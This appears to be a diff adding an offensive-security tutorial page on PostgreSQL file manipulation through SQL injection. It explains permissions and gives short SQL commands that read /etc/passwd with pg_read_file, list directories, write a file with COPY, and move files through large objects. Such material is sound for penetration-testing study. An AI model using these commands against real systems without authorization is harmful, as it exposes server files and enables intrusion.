@@ -1,0 +1,110 @@
+---
+title: PostgreSQL File Manipulation Techniques
+description: Explore techniques for manipulating files via SQL injection in PostgreSQL,
+  focusing on permissions and SQL functions for file access.
+keywords:
+- PostgreSQL
+- File Manipulation
+- SQL Injection
+- pg_read_file
+- pg_ls_dir
+- COPY
+- large objects
+- lo_import
+- lo_export
+---
+
+# PostgreSQL File Manipulation
+
+## Context
+
+This tutorial teaches how to exploit PostgreSQL for file manipulation via SQL injection. Readers are expected to have prior knowledge of SQL queries, database permissions, and file system permissions.
+
+## Theory
+
+### Understanding PostgreSQL Permissions
+
+PostgreSQL permissions are an essential aspect of database security, controlling access to database objects and specific operations. To perform file manipulation, certain database roles and privileges are required. These permissions, if misconfigured, can be exploited to gain unauthorized access to the server's file system.
+
+### Exploiting File System Access via SQL Injection
+
+The process of exploiting file system access in PostgreSQL through SQL injection involves several steps:
+
+1. **Identify SQL Injection Point**: Find a vulnerability in the web application where SQL queries can be manipulated through user input.
+   
+2. **Determine Database User Permissions**: Check the current user's permissions to understand what operations they can perform. This can often be done through existing query outputs or error messages.
+
+3. **Leverage SQL Functions for File Manipulation**: Utilize built-in PostgreSQL functions to read from or write to the file system, depending on the permissions available.
+
+### PostgreSQL File Manipulation Functions
+
+- **pg_read_file**: Allows reading files directly from the server's file system. Its execution depends on the access rights assigned to the PostgreSQL server process.
+
+- **pg_ls_dir**: Lists directory contents on the server, providing insights into files and directories present on the server.
+
+- **COPY**: Used to write query results to a file, facilitating the export of data from the database to a server file.
+
+- **lo_import**: Imports a file into a large object within PostgreSQL, which can then be manipulated or accessed as part of the database.
+
+- **lo_from_bytea**: Creates a large object from bytea data, allowing direct binary data input to large objects.
+
+- **lo_put**: Writes specific data to a large object, effectively manipulating large object contents.
+
+- **lo_export**: Exports a large object to a file on the server, allowing retrieval of binary data from the database.
+
+## Practice
+
+### File Read via pg_read_file
+
+To read files from the server using PostgreSQL:
+
+```bash
+SELECT pg_read_file('/etc/passwd', 0, 1000);
+```
+
+Executing this command will read the first 1000 bytes of the `/etc/passwd` file, potentially exposing sensitive file contents.
+
+### Directory Listing via pg_ls_dir
+
+To list directory contents on the server:
+
+```bash
+SELECT pg_ls_dir('/var/lib/postgresql');
+```
+
+This command will provide a list of files and directories present in the `/var/lib/postgresql` directory, revealing the structure of the directory.
+
+### File Write via COPY
+
+To write arbitrary data to a file on the server:
+
+```bash
+COPY (SELECT 'malicious content') TO '/tmp/malicious.txt';
+```
+
+This command writes the string 'malicious content' to a file named `malicious.txt` in the `/tmp` directory, demonstrating how data can be uploaded to the server's file system.
+
+### Large Object Import via lo_import
+
+To import a file as a large object:
+
+```bash
+SELECT lo_import('/tmp/uploaded_file');
+```
+
+By executing this command, a file from the server file system is imported into the PostgreSQL database as a large object, enabling further manipulation or access.
+
+### Large Object Export via lo_export
+
+To export a large object to a file on the server:
+
+```bash
+SELECT lo_export(oid, '/tmp/exported_file');
+```
+
+This command exports the data held in a large object identified by `oid` to `exported_file`, allowing for easy retrieval of large object data from the database.
+
+## Tools
+
+- **psql**
+- **Metasploit** 
